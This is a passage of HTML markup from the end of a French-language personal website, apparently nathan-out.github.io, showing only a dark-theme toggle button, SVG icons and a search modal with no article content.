          type="button"
          title="Passer au thème sombre"
        >
          <span class="inline dark:hidden">

  <span class="relative inline-block align-text-bottom icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>

  </span>

</span>
          <span class="hidden dark:inline">

  <span class="relative inline-block align-text-bottom icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>

  </span>

</span>
        </button>
      </div>
    
  </div>
  
  
</footer>
<div
  id="search-wrapper"
  class="fixed inset-0 z-50 flex flex-col p-4 sm:p-6 md:p-[10vh] lg:p-[12vh] w-screen h-screen cursor-default bg-neutral-500/50 backdrop-blur-sm dark:bg-neutral-900/50 invisible"
  data-url="https://nathan-out.github.io/"
>
  <div
    id="search-modal"
    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg border-neutral-200 top-20 bg-neutral dark:bg-neutral-800 dark:border-neutral-700"
  >
    <header class="relative z-10 flex items-center justify-between flex-none px-2">
      <form class="flex items-center flex-auto min-w-0">
        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
          

  <span class="relative inline-block align-text-bottom icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


        </div>
        <input
          type="search"
          id="search-query"
          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-transparent focus:outline-2"
          placeholder="Rechercher"
          tabindex="0"
        />
      </form>
      <button
        id="close-search-button"
        class="flex items-center justify-center w-8 h-8 text-neutral-700 dark:text-neutral hover:text-primary-600 dark:hover:text-primary-400"
        title="Fermer (Esc)"
      >
        

  <span class="relative inline-block align-text-bottom icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>

  </span>


      </button>
    </header>
    <section class="flex-auto px-2 overflow-auto">
      <ul id="search-results">
        
      </ul>
    </section>
  </div>
</div>

    </div>
  </body>
</html>
